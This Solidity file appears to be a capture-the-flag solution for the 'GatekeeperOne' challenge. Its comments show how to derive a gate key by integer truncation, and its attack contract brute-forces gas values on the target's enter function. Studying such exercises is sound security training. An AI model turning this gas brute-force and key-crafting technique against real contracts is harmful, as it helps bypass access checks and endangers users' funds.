// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// To find gate Key:
// 1. uint16(address) => last 4 digits of address (address in hex, 1 digit=4bits), truncating any bits before
// 2. extend to uint64 => 000000000000xxxx (append 0s until 16 digits)
// 3. flip one bit of above so that uint32(a) != a, i.e. truncate the first 8 digits will make the value different => 000000010000xxxx
contract GateKeeperOneHack {
  address gateKeeperOneContract;
  uint requiredGas;

  constructor(address _gateKeeperOneAddress) {
    gateKeeperOneContract = _gateKeeperOneAddress;
  }

  function findRequiredGas(bytes8 key) public {
    for (uint i = 0; i < 8191; ++i) {
      (bool success, ) = payable(gateKeeperOneContract).call{gas: 8191*3 + i}(abi.encodeWithSignature("enter(bytes8)", key));
      if (success) {
        requiredGas = 8191*3 + i;
        break;
      }
    }
  }
}